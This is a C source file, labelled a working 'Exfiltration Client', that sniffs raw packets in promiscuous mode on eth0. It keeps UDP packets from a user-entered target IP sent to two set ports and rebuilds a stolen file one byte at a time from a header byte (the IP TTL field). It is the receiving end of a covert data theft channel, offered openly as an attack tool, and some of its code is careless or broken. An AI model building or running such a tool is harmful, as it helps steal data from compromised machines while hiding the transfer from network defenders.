#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ether.h>

#define ETHER_TYPE	0x0800
#define BUF_SIZ	1024

/* Exfiltration Client */
/* Notes: Program to receive exfiltrated file via packets and reassmbled it */
/* Working version */

int main ()
{
	int sock, i, c, n;
	int sockopt;
	ssize_t numbytes;
	struct ifreq ifopts;
	uint8_t buf[BUF_SIZ];
	uint8_t IP_1, IP_2, IP_3, IP_4;
	//int IP_1, IP_2, IP_3, IP_4; 
	uint8_t prt_1, prt_2, prt_3, prt_4, prot, prot2, nul, zilch, eof;
	FILE *ofp; 
	FILE *ofp2;
	FILE *ofp3;	

	/*uint8_t cur_hex;*/
	char ifName[IFNAMSIZ];
	strcpy(ifName, "eth0");
	char tar_ip[15];
	char *parse;
//	IP_1 = 192;
//	IP_2 = 168;
//	IP_3 = 01;
	//IP_3 = 217;
//	IP_4 = 229;
	//IP_4 = 130;

	prt_1=0x30;
	prt_2=0xD9;
	prt_3=0x30;
	prt_4=0xDB; 
	prot=17;
	//prot2=0x06; 
	c = 1; 
	n = 1;
	nul = 0x80;
	zilch = 0x00;
	eof = 0xFF;

	/* Record IP of target machine */
	printf("Enter the IPv4 address of the target\n");
	scanf("%s", &tar_ip);
	//printf("%s\n", tar_ip);  
	parse = strtok(tar_ip, ".");
	
	while (parse != NULL) {
		//printf("%s\n", parse); 
		if (n == 1) {
			IP_1 = atoi(parse);
		}
		if (n == 2) {
			IP_2 = atoi(parse);
		}
		if (n == 3) {
			IP_3 = atoi(parse);
		}
		if (n == 4) {
			IP_4 = atoi(parse);
		}
		n++; 
		parse = strtok(NULL, ".");
	}

	printf("Target IP is %d.%d.%d.%d\n", IP_1, IP_2, IP_3, IP_4);

	/* Create socket and assign details */

	if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETHER_TYPE))) == -1) {
		perror("listener: socket");
		return -1;
	}
	
	strncpy(ifopts.ifr_name, ifName, IFNAMSIZ-1);
	ioctl(sock, SIOCGIFFLAGS, &ifopts);
	ifopts.ifr_flags |= IFF_PROMISC; 
	ioctl(sock, SIOCSIFFLAGS, &ifopts);

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &sockopt, sizeof sockopt) == -1) {
		perror("setsockopt");
		close(sock);
		exit(EXIT_FAILURE);
	}
	
	/* Bind */
	if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifName, IFNAMSIZ-1) == -1) {
		perror("SO_BINDTODEVICE");
		close(sock);
		exit(EXIT_FAILURE);
	}

	while (c < 10) {
	/* Read from socket */
		numbytes = recvfrom(sock, buf, BUF_SIZ, 0, NULL, NULL); 
		printf("listener: got packet %lu bytes\n", numbytes); 
	
	/* Print packets */
	/* printf("\tData:"); */
		for (i=0; i < numbytes; i++) {
			/* printf("%02x:", buf[i]); */		
		}
/*			printf("\n"); */
	
			if (buf[26] == IP_1 && buf[27] == IP_2 && buf[28] == IP_3 && buf[29] == IP_4) {
				printf("Received packet from target\n");
			
				if (buf[23] == prot) {
					printf("Packet is UDP\n");
								
					if (buf[36] == prt_1 && buf[37] == prt_2) {
						printf("Packet is going to main listener port\n");
						printf("\n");
						
						ofp = fopen("./exfil_file_ascii", "a");
						ofp2 = fopen("./exfil_file_hex", "a"); 
						ofp3 = fopen("./exfil_file", "ab"); 
						fprintf(ofp, "%c", buf[22]); 
						fprintf(ofp2, "%02x", buf[22]);
						fwrite(&buf[22], sizeof(buf[22]), 1, ofp3); 
						fclose(ofp); 
						fclose(ofp2);
						fclose(ofp3); 
					}
					if (buf[36] == prt_3 && buf[37] == prt_4) {
						printf("Packet is going to alternate listener port\n");
						printf("\n");
						 
						ofp = fopen("./exfil_file_ascii", "a");
						ofp2 = fopen("./exfil_file_hex", "a");
						ofp3 = fopen("./exfil_file", "ab"); 
						if (buf[22] == nul) {  
							fprintf(ofp, "%c", "\0"); 
							fprintf(ofp2, "%02x", 00);
							fwrite(&zilch, sizeof(zilch), 1, ofp3); 
							fclose(ofp); 
							fclose(ofp2); 
							fclose(ofp3); 
						}
						if (buf[22] == eof) {
							fclose(ofp); 
							fclose(ofp2); 
							fclose(ofp3); 
							break; 
						}
					}
				} 
			}
	}
	/* Close socket */
	close(sock); 
}
